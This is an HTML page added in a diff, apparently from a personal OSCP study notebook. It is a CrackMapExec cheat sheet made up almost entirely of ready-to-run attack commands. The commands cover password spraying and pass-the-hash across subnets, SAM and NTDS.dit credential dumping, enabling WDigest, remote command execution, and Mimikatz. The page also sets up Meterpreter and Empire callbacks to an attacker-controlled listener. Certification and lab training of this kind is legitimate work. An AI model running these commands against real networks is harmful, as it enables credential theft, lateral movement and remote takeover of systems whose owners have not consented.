@@ -1,0 +1,469 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>CrackMapExec Cheat Sheet - Brandon&#x27;s OSCP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">1.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">1.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">1.3.</strong> File Transfer</a></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">1.4.</strong> Ports</a></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">1.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html" class="active"><strong aria-hidden="true">2.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">2.2.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">2.3.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html"><strong aria-hidden="true">2.3.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">2.3.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">2.4.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">2.5.</strong> File Uploads</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">2.5.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">2.5.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">2.5.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">2.6.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">2.7.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">2.8.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">2.9.</strong> SQL</a></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">2.10.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">2.11.</strong> XXE_XSS_Deserialization</a></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">2.12.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">3.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">3.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">5.1.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">5.2.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">5.3.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">5.4.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">5.5.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">5.6.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">5.7.</strong> Persistence</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <pre><code># General help
+crackmapexec --help
+
+# Protocol help
+cracmapexec smb --help
+
+
+</code></pre>
+<h3 id="connexions--spraying"><a class="header" href="#connexions--spraying">Connexions &amp; Spraying</a></h3>
+<pre><code># Target format
+crackmapexec smb ms.evilcorp.org
+crackmapexec smb 192.168.1.0 192.168.0.2
+crackmapexec smb 192.168.1.0-28 10.0.0.1-67
+crackmapexec smb 192.168.1.0/24
+crackmapexec smb targets.txt
+
+# Null session
+crackmapexec smb 192.168.10.1 -u "" up ""
+
+# Connect to target using local account
+crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth
+
+# Pass the hash against a subnet
+crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
+crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'
+
+# Bruteforcing and Password Spraying
+crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
+crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
+crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
+crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
+crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
+
+</code></pre>
+<h3 id="enumeration"><a class="header" href="#enumeration">Enumeration </a></h3>
+<h4 id="users"><a class="header" href="#users">Users</a></h4>
+<pre><code>
+# Enumerate users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users
+
+# Perform RID Bruteforce to get users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute
+
+# Enumerate domain groups
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups
+
+# Enumerate local users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users
+
+</code></pre>
+<h4 id="hosts"><a class="header" href="#hosts">Hosts</a></h4>
+<pre><code># Generate a list of relayable hosts (SMB Signing disabled)
+crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt
+
+# Enumerate available shares
+crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares
+
+# Get the active sessions
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions
+
+# Check logged in users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers
+
+# Get the password policy
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
+
+</code></pre>
+<h3 id="execution--co"><a class="header" href="#execution--co">Execution &amp; Co</a></h3>
+<pre><code># CrackMapExec has 3 different command execution methods (in default order) :
+# - wmiexec --&gt; WMI
+# - atexec --&gt; scheduled task
+# - smbexec --&gt; creating and running a service
+
+# Execute command through cmd.exe (admin privileges required)
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'
+
+# Force the smbexec method
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec
+
+# Execute commands through PowerShell (admin privileges required)
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'
+
+
+</code></pre>
+<h3 id="getting-credentials"><a class="header" href="#getting-credentials">Getting Credentials</a></h3>
+<pre><code># Dump local SAM hashes
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
+
+# Enable or disable WDigest to get credentials from the LSA Memory
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
+
+# Then you juste have to wait the user logoff and logon again
+# But you can force the logoff
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff &lt;sessionid&gt;'
+
+# Dump the NTDS.dit from DC using methods from secretsdump.py
+
+# Uses drsuapi RPC interface create a handle, trigger replication
+# and combined with additional drsuapi calls to convert the resultant 
+# linked-lists into readable format
+crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
+
+# Uses the Volume Shadow copy Service
+crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+
+# Dump the NTDS.dit password history
+smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
+
+
+</code></pre>
+<h3 id="using-the-database"><a class="header" href="#using-the-database">Using the database</a></h3>
+<pre><code># The database automatically store every hosts reaches by CME and all credentials with admin access
+cmedb
+
+# Using workspaces
+cmedb&gt; workspace create test
+cmedb&gt; workspace test
+
+# Access a protocol database and switch back
+cmedb (test)&gt; proto smb
+cmedb (test)&gt; back
+
+# List stored hosts
+cmedb&gt; hosts
+
+# View detailed infos for a specific machine (including creds)
+cmedb&gt; hosts &lt;hostname&gt;
+
+# Get stored credentials
+cmedb&gt; creds
+
+# Get credentials access for a specific account
+cmedb&gt; creds &lt;username&gt;
+
+# Using credentials from the database
+crackmapexec smb 192.168.100.1 -id &lt;credsID&gt;
+
+
+</code></pre>
+<h3 id="modules"><a class="header" href="#modules">Modules</a></h3>
+<pre><code># List available modules
+crackmapexec smb -L
+
+# Module information
+crackmapexec smb -M mimikatz --module-info
+
+# View module options
+crackmapexec smb -M mimikatz --options
+
+# Mimikatz module
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
+crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
+
+[*] Get-ComputerDetails       Enumerates sysinfo
+[*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers\' machine
+[*] empire_exec               Uses Empire\'s RESTful API to generate a launcher for the specified listener and executes it
+[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
+[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
+[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
+[*] get_keystrokes            Logs keys pressed, time and the active window
+[*] get_netdomaincontroller   Enumerates all domain controllers
+[*] get_netrdpsession         Enumerates all active RDP sessions
+[*] get_timedscreenshot       Takes screenshots at a regular interval
+[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
+[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
+[*] invoke_vnc                Injects a VNC client in memory
+[*] met_inject                Downloads the Meterpreter stager and injects it into memory
+[*] mimikatz                  Dumps all logon credentials from memory
+[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
+[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
+[*] mimikittenz               Executes Mimikittenz
+[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
+[*] netripper                 Capture`\'s credentials by using API hooking
+[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
+[*] rdp                       Enables/Disables RDP
+[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
+[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
+[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
+[*] test_connection           Pings a host
+[*] tokens                    Enumerates available tokens
+[*] uac                       Checks UAC status
+[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows &gt;= 8.1
+[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
+
+
+
+</code></pre>
+<h3 id="getting-shells"><a class="header" href="#getting-shells">Getting shells </a></h3>
+<h4 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h4>
+<pre><code># First, set up a HTTP Reverse Handler
+msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https
+msf exploit(handler) &gt; set LHOST 192.168.10.3
+msf exploit(handler) &gt; set exitonsession false
+msf exploit(handler) &gt; exploit -j
+
+# Met_Inject module
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444 
+
+</code></pre>
+<h4 id="empire"><a class="header" href="#empire">Empire</a></h4>
+<pre><code># Start RESTful API
+empire --rest --user empireadmin --pass gH25Iv1K68@^
+
+# First setup an Empire HTTP listener
+(Empire: listeners) &gt; set Name test
+(Empire: listeners) &gt; set Host 192.168.10.3
+(Empire: listeners) &gt; set Port 9090
+(Empire: listeners) &gt; set CertPath data/empire.pem
+(Empire: listeners) &gt; run
+(Empire: listeners) &gt; list
+
+# Start RESTful API
+# The username and password that CME uses to authenticate to Empire's RESTful API 
+# Are stored in the cme.conf file located at ~/.cme/cme.conf
+empire --rest --user empireadmin --pass gH25Iv1K68@^
+
+# Empire Module
+crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest
+
+
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="Shells.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="Web Shells.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="Shells.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="Web Shells.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
